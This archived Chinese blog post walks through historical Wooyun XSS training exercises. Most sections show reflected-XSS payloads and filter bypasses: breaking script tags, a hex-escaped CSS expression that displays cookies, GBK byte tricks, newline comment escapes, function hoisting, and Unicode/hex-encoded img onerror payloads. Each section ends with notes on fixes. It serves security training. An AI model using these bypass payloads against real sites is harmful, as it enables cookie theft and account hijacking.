---
title: "XSS Practice: Following Output Context"
title_zh: "乌云 XSS 练习：沿输出上下文定位问题"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: XSS-Wooyun Practice
date: 2019-03-14 20:29:00
slug: XSS-Wooyun-Practice
permalink: writing/XSS-Wooyun-Practice/
topic: Application security
summary: "Tracing input into HTML, attributes and JavaScript through historical Wooyun training exercises."
summary_zh: "围绕乌云模拟题观察输入出现的位置与被过滤字符，逐步推导 HTML、属性和 JavaScript 上下文中的构造方式，保留失败尝试、编码细节及修复讨论。"
format_label: Technical notes
featured_rank: 0
missing_images: 13
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## <1>

（历史实验入口已移除）

### 测试方法

经过测试，我们发现，当在score后输入<>HTML标签时，查看源码，发现![历史配图暂缺](redacted-image:missing)
这便说明存在XSS漏洞，![历史配图暂缺](redacted-image:missing)

### 修复方法

>a. 通常，我们只需要在输出前，将 < , > 过滤掉即可。
>b. 这类XSS在小型网站中比较常见，在大型网站中少见。
>c. 这类XSS通常都被浏览器的XSS过滤器秒杀了，所以一般来说，威力较小。
>d. 对于普通用户来说，请使用IE8及以上版本（并开启XSS过滤器功能，默认开启），或chrome浏览器，将可以防御大部分此种类型的XSS攻击。

## <2>

（历史实验入口已移除）

### 测试方法

输入aaaaaa<>我们发现出现位置如下
![历史配图暂缺](redacted-image:missing)

### 解法1

1 首先判断，是否过滤了 < , > , / 等符号，
2 如果都没有过滤，恭喜你，一般可以直接XSS了。代码如下：
```http://app.example.invalid/common/setParentsInfo.php?callback=aaaaaaaaa</script><script>alert(1)</script>```
![历史配图暂缺](redacted-image:missing)

**但是天有不测风雨， 如果过滤了 <, >，那么就无法使用上面的办法了**

### 解法2

构造js代码：
```eval('alert(1)');void```
![历史配图暂缺](redacted-image:missing)
**payload是不固定的，也就是说，我们插入的内容，使得这一段javascript依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的JS代码】，这样我们的目的就达到了。
类似于var a="[输出]"; // 不过通常程序员会把 " 过滤掉， 这样的话，一般来说，我们就很难构造。**

### 修复方案

```
 1. 过滤 </xxx> 组合 
 2. 针对输出在不同的场景，进行合适的过滤。 
```

## <3.1>

（历史实验入口已移除）

### 测试

输入<>，发现被过滤了，查看源码发现，双引号不会被过滤，故我们因此构想payload

### 解法

![历史配图暂缺](redacted-image:missing)
当用户点击这个文本框时，就会触发 XSS

## <3.2>

（历史实验入口已移除）

### 测试

输入<>/"(),发现只有/没有被过滤，如何只用 \ 构造利用语句呢，我们可以想到CSS 中的字符编码，CSS 提供了一套转义处理策略，一个反斜杠后边跟1~6位十六进制数字。然后利用CSS 的expression 来调用JavaScript 代码。也就是试图构造出

```  
expression(eval(alert(/xss/))
```

### 解法

完整的代码如下：

```
<body style="... background-color:;width:expression(eval(alert(/xss/)))">
```

完整的payload:

```
bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29

```

用分号来结束backgroud-color,然后 w: 后边跟上expression,如果expression 要被过滤，那就加上转义，把expression 随意变下形就可以，于是，在下边这样的代码构造下，漏洞又被利用了。

试了很多次，发现一直不出现XSS，原来

>expression 当年是微软搞出来的技术，但是一直没被其他浏览器接受，同时，甚至微软自己如今也抛弃了这种特性，它出现在IE6，IE7，和IE8的一些早期版本，因为微软官方也认为该属性不具有通用性，而且它处理的事务，如今已经能够在CSS 中正常的完成，如min-width,max-width， 这些都已经在IE8之后得到很好的支持，所以expression 也只能在这两个古老版本上起效。

## <3.3>

（历史实验入口已移除）

### 测试

输入aaaaaaaa<>'/"()测试
![历史配图暂缺](redacted-image:missing)
根据测试，我们发现只有/,(),'这三个符号没被过滤，而且攻击点在第二个等于后面。
........&searchvalue_yjbg=aaaaaa'

.......&searchvalue_yjbg=aaaaaa'+alert(1)+''

........&searchvalue_yjbg=aaaaaa&#x27;+alert(1)+&#x27

### 解法

&: %26, #: %23,+:%2b,':%27
payload:

```
aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27
```

由于缺陷点是发生在 onkeydown 或 a 标签的 href 属性中，无法自动触发，因而使得威胁减小，如果是发生在 img 的 onload 属性，则非常可能导致自动触发，故需手动点击GO触发XSS。

### 修复方法(综合以上三个)

```
1. 对于输出在HTML属性中的情况，需要特殊情况特殊对待，该过滤\的时候，请过滤\, 该过滤&的情况，则过滤掉&
2. 碰到有某些修复的人用正则去判断， &#xNNN.., 而实际上 &#x0NN; &#x00NN, （后面自己慢慢试。。） 都是可以的。 或者是 &#10进制; 以及一些特殊的HTML实体，如 &quot;等，都要注意到，好麻烦， 最好的办法，还是 &过滤为 &amp; ：） 
```

## <4>

### 测试

输入<>'/()“
发现"<>被过滤

```
%df"alert(1)
```

![历史配图暂缺](redacted-image:missing)
我们发现还有一个"没有闭合，但是直接加上"，会被过滤，所以我们想到//注释符号将它注释即可

```
%df"alert(1)//
```

发现还不行
![历史配图暂缺](redacted-image:missing)
不难想到这是代码，结尾要用;，故

```
%df";alert(1)//
```

### 修复方案

修复相关过滤机制。

# <5>

（历史实验入口已移除）
由于网站问题，本题只出示思路。

### 测试

输入常用符号，经过测试，我们可以看到，双引号是用不了， 但是 反斜线还可以使用。\可以用

### 提取缺陷代码

```js
<script>getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin="+"&t="+"&alias="+"&regalias="+"&delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1"+"&title="+"&url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1"+"&org_fun="+"&aliastype="+"&ss=aaa"+"&from=bbb"+"&param="+"&sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg"+"&r=3ec785174fff5206ed6f0cf4a8c5e3c5"+"&ppp="+"&secpp="</script>
```

### 缺陷部分

"........."+"&ss=aaaa"+"&from=bbb"+"&param=";

### 解题

反斜线是用来表示转义，我们要控制aaaa但是不能使用双引号，这时就可以用反斜线进行对双引号的转义，
语法发生变化：

```
<script>getTop().location.href="......"+ "&ss=aaa\"+" &from=bbb "+" ¶m= "+" .....";</script>
```

这样看起来虽然前面的语法正确，但是后面的语句却不太正常，故，我们只需使用//将后面的语句进行注释即可。

```
location.href="........."+"&ss=aaaa\"+"&from=1//"+"¶m=";
```

但是还有一个问题，& 在这里，被考虑成了一个与操作，优先级是高于 =号的，变成了(“字符串”&from)=1 的语法，这仍然是错误的。但是，如果我们再测试一下，= 号会不会被屏蔽呢，=号也可以用，那么我们改变一下语法，添加一个等号，变成 ==：

```
location.href="........."+"&ss=aaaa\"+"&from==1//"+"¶m=";
```

于是语法编程了(“string”)&(from==1)的样式，from 变成了一个bool操作，但现在又面临了新的问题，如果你在URL 里本来该是一个定义的操作，却变成了一个判断的操作，from 就变成了未定义的状态了，语法仍然会报错，这我们就要进一步理解JavaScript的语法了，如果我们把from 当做一个变量或者是方法，如果是方法，无论在何处定义，都会被拉到最简便，利用这样一个特性，我们的代码可以改改。

```
location.href="........."+"&ss=aaaa\"+"&from==1;function from(){}//"+"&param=";
```

这样一来，我们的 function from(){} 就会被提前解析，从而定义了from, 后面 from==1的时候，就不会报错.
但问题又来了，我们现在添加了许多东西，而添加的这些东西，包含了许多特殊字符，会不会通过呢，经过实际测试，空格符被转义了。
空格符被转义了怎么办呢，我们找到新的替换品，那就是/**/, 这是一个注释符，之前我们也测试过了，斜杠不会被过滤，那么这个注释符，成功的顶替了空格，形成了正常的语法。
故最终payload：

```
http://mail.example.invalid/cgi-bin/login?vt=passport&ss=\&from==0;alert(1);function/**/from(){};//&delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1
```

### 知识点

1.==的优先级比 & 高，所以语句相当于 ("字符串")&(from==1)
2.from未定义，直接和1进行相等判断的话，会报错，错误是：“from”未定义

3.javascript里有一个特性:

```
aaa();
function aaa(){
}
```

凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。换句话说：
解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是：

```
function aaa(){
}
aaa();
```

这便是隐藏在payload中的知识点

```
location.href="........."+"&ss=aaaa\"+"&from==1;alert(1);function/**/from(){}//"+"&param=";
```

```
function from()
{
aaaaa from == 1;
alert(1);
}
```

## <6>

（历史实验入口已移除）

### 测试

用了几个常用符
![历史配图暂缺](redacted-image:missing)
我们在一些注释的代码中也能发现我们的符号们，不难发现被过滤的和没被过滤的
那么我们需要思考，如果我们能让代码跳出注释范围，再利用alert(1)触发XSS，这样不就达到我们的目的了吗？

### 解题

所以这里需要再科普一下**换行符%0a**
现在在view source里先构造我们的payload，观察有没有什么变化，
![历史配图暂缺](redacted-image:missing)
不难发现我们已经成功跳出注释圈，成功的触发XSS，不过这里也要注意，为了闭合后面的",由于双引号被过滤，所以我们只能将它注释掉。
payload:

```
%0aalert(1);//
```

## <7>

（历史实验入口已移除）

### 测试

![历史配图暂缺](redacted-image:missing)
简单的测试，能找到被过滤的符号

### 审计

通过审计我们发现，这与上一道题相似，需要跳出注释圈

### 解题

```
aaa%5c%0aalert(1);//
```

发现不太行，源码里多了一个\，也就是这里防\，所以我们需要吃掉\

```
aaa%c0%5c%0aalert(1);//
```

### 知识点

javascript，字符串允许下面多行的写法。

```
var  a="我是一个字符串\

我还是一个字符串";

alert(a);
```

基于这点，把缺陷点构造成下面的样子。

```
//document.getElementById("order_select").value = "aaaa\
alert(1);//";

 var searchOrder = "aaaa\

alert(1);//";
```

也就是用到换行符 %0a
反斜杠问题中%c0可以吃掉%5c
%5c就是\

## <8.1>

（历史实验入口已移除）

### 测试

测试之后我们发现过滤情况和之前差不多。
在js中的字符串中的字符可以写为 unicode编码。
故我们将<>进行编码，< 可以表示为 \u003c , > 可以表示为 \u003e

### 解题

```<img src=1>```输入后我们发现页面没有反应 ，查看源码我们发现<>被过滤的问题没有解决
```\u003cimg src=1\u003e``` 再次尝试 ，发现页面出现反应了，利用这个漏洞
```\u003cimg src=1 onerror=alert(1)\u003e```

## <8.2>

（历史实验入口已移除）

#### 测试

经过简单的测试发现它和上一道题基本类似

### 解题

那我们就开始大胆的解题了，尝试用上一道题的方法
![历史配图暂缺](redacted-image:missing)
很遗憾，很不幸，很失望，我们发现unicode编码<>也被过滤了
在JS字符串里， < 不光可以写为 \u003c，还可以写为 \x3c， > 同样可以写为 \x3e。
我们再试试这个，出现弹窗。故，

 ```
\x3cimg src=1 onerror=alert(1)\x3e
 ```

### 修复方案

修复方案：
方法1. 输出时，过滤 \
方法2. innerHTML=encodeHTML([输出])
